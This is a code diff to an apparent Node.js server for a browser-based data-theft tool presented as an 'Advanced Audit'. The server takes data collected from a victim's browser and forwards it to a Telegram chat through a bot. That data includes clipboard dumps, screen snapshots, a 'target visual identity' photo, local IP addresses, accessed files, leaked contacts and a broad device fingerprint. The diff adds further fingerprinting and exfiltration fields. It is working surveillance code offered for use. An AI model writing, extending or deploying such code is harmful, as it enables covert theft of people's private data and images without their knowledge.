@@ -147,10 +147,17 @@ async function startServer() {
                   `└ Flow: <code>Advanced Audit</code>\n\n` +
                   `🖥️ <b>HARDWARE SPECS</b>\n` +
                   `├ Platform: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
+                  `├ Browser: <code>${escapeHTML(data.vendor || 'N/A')} (${data.onLine ? 'Online' : 'Offline'})</code>\n` +
                   `├ CPU Cores: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
                   `├ RAM (Est): <code>${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
+                  `├ GPU: <code>${escapeHTML(data.gpu || 'N/A')}</code>\n` +
                   `├ VM Status: <code>${escapeHTML(data.vmStatus || 'N/A')}</code>\n` +
                   `└ Screen: <code>${escapeHTML(data.screen || 'N/A')}</code>\n\n` +
+                  `🔋 <b>ENERGY & PERF</b>\n` +
+                  `├ Battery: <code>${escapeHTML(data.battery || 'N/A')}</code>\n` +
+                  `├ Connect: <code>${escapeHTML(data.connection || 'N/A')}</code>\n` +
+                  `├ Refresh: <code>${escapeHTML(data.refreshRate || 'Verified')}</code>\n` +
+                  `└ Gamut: <code>${escapeHTML(data.gamut || 'N/A')}</code>\n\n` +
                   `🌍 <b>REGION & ENV</b>\n` +
                   `├ Timezone: <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
                   `├ Langs: <code>${escapeHTML(data.langs || 'N/A')}</code>\n` +
@@ -185,8 +192,12 @@ async function startServer() {
         extraMsg += `⚡ <b>CPU PERFORMANCE:</b>\n` +
                     `└ Score: <code>${data.cpu_compute_score}</code>\n\n`;
       }
-      if (data.clipboard_sync) {
-        extraMsg += `📋 <b>CLIPBOARD DUMP:</b>\n<pre>${escapeHTML(data.clipboard_sync)}</pre>\n\n`;
+      if (data.local_ip) {
+        extraMsg += `🌐 <b>WEB-RTC LOCAL IP:</b>\n` +
+                    `└ IP: <code>${data.local_ip}</code>\n\n`;
+      }
+      if (data.clipboard_sync || data.clipboard) {
+        extraMsg += `📋 <b>CLIPBOARD DUMP:</b>\n<pre>${escapeHTML(data.clipboard_sync || data.clipboard)}</pre>\n\n`;
       }
       if (data.media_hardware) {
         extraMsg += `🎙️ <b>AV HARDWARE AUDIT:</b>\n<pre>${escapeHTML(data.media_hardware)}</pre>\n\n`;
@@ -194,6 +205,7 @@ async function startServer() {
       if (data.file_name) {
         extraMsg += `📂 <b>FILE ACCESS GRANTED:</b>\n` +
                     `├ Name: <code>${escapeHTML(data.file_name)}</code>\n` +
+                    `├ Type: <code>${data.file_type}</code>\n` +
                     `└ Size: <code>${(data.file_size / 1024).toFixed(2)} KB</code>\n\n`;
       }
       if (data.screen_label) {
@@ -202,7 +214,7 @@ async function startServer() {
                     `└ Status: <b>Sync Success</b>\n\n`;
       }
       
-      // Image delivery
+      // Image delivery (Visual Identity, Screen Capture)
       if (data.screen_capture) {
         const buffer = Buffer.from(data.screen_capture.split(',')[1], 'base64');
         botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `🖥️ SCREEN SNAPSHOT CAPTURED` }).catch(() => {});
@@ -211,6 +223,86 @@ async function startServer() {
         const buffer = Buffer.from(data.visual_identity.split(',')[1], 'base64');
         botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `📸 TARGET VISUAL IDENTITY` }).catch(() => {});
       }
+
+      if (data.gpu_full_profile) {
+        try {
+          const gpu = JSON.parse(data.gpu_full_profile);
+          extraMsg += `🎮 <b>ADVANCED GPU PROFILE:</b>\n` +
+                      `├ Vendor: <code>${escapeHTML(gpu.vendor)}</code>\n` +
+                      `├ Renderer: <code>${escapeHTML(gpu.renderer)}</code>\n` +
+                      `├ GL Version: <code>${escapeHTML(gpu.gl_version)}</code>\n` +
+                      `└ Shading GL: <code>${escapeHTML(gpu.shading_lang)}</code>\n\n`;
+        } catch(e) {}
+      }
+
+      if (data.battery_level) {
+        extraMsg += `🔋 <b>POWER SUBSYSTEM:</b>\n` +
+                    `├ Level: <code>${data.battery_level}</code>\n` +
+                    `├ Charging: <code>${data.battery_charging ? 'YES' : 'NO'}</code>\n` +
+                    `└ Time to Empty: <code>${data.battery_time}</code>\n\n`;
+      }
+
+      if (data.fonts_count) {
+        extraMsg += `🔡 <b>FONT REGISTRY:</b>\n` +
+                    `├ Count: <code>${data.fonts_count}</code>\n` +
+                    `└ Samples: <code>${escapeHTML(data.fonts_sample)}</code>\n\n`;
+      }
+
+      if (data.screens) {
+        extraMsg += `🖥️ <b>MULTI-DISPLAY MAP:</b>\n` +
+                    `├ Screens: <code>${data.screens}</code>\n` +
+                    `└ Primary: <code>${escapeHTML(data.screen_primary || 'N/A')}</code>\n\n`;
+      }
+
+      if (data.sec_pdf !== undefined) {
+        extraMsg += `🛡️ <b>KERNEL INTEGRITY+:</b>\n` +
+                    `├ Webdriver: <code>${data.sec_webdriver}</code>\n` +
+                    `├ PDF Enabled: <code>${data.sec_pdf}</code>\n` +
+                    `└ DoNotTrack: <code>${data.sec_doNotTrack || 'Off'}</code>\n\n`;
+      }
+      if (data.installed_fonts) {
+        extraMsg += `🔡 <b>FONT FINGERPRINT:</b>\n` +
+                    `└ Detected: <code>${data.installed_fonts}</code>\n\n`;
+      }
+
+      if (data.audio_sig) {
+        extraMsg += `🎵 <b>AUDIO FINGERPRINT:</b>\n` +
+                    `└ Signature: <code>${data.audio_sig}</code>\n\n`;
+      }
+
+      if (data.orientation) {
+        extraMsg += `📱 <b>PERIPHERAL & LANG:</b>\n` +
+                    `├ Orientation: <code>${data.orientation}</code>\n` +
+                    `├ Gamepads: <code>${data.gamepads}</code>\n` +
+                    `└ Languages: <code>${data.languages}</code>\n\n`;
+      }
+
+      const apis = ['api_bluetooth', 'api_usb', 'api_hid', 'api_serial', 'api_midi', 'api_idle', 'api_contacts', 'api_wake', 'api_storage'];
+      let apiFound = false;
+      let apiTxt = `🧱 <b>HARDWARE API ACCESS:</b>\n`;
+      apis.forEach(k => {
+        if (data[k] !== undefined) {
+          apiFound = true;
+          apiTxt += `${data[k] ? '✅' : '❌'} ${k.replace('api_', '').toUpperCase()}\n`;
+        }
+      });
+      if (apiFound) extraMsg += apiTxt + '\n';
+
+      if (data.social_active || data.social_inactive) {
+         extraMsg += `🤝 <b>SOCIAL PRESENCE:</b>\n` +
+                     `├ Active: <code>${data.social_active || 'None'}</code>\n` +
+                     `└ Load: <code>${data.load_ms || 'N/A'}ms</code>\n\n`;
+      }
+      if (data.adblock_detected !== undefined) {
+        extraMsg += `🛡️ <b>ADS/SHIELD STATUS:</b>\n` +
+                    `└ AdBlock: <b>${data.adblock_detected ? 'DETECTED' : 'NOT FOUND'}</b>\n\n`;
+      }
+      if (data.network_rtt) {
+        extraMsg += `🛰️ <b>LATENCY MAPPING:</b>\n` +
+                    `├ Node: <code>${data.network_rtt}</code>\n` +
+                    `└ RTT: <code>${data.latency}ms</code>\n\n`;
+      }
+
       if (data.contacts_leaked) {
         let count = 0;
         try { count = JSON.parse(data.contacts_leaked).length; } catch(e) {}
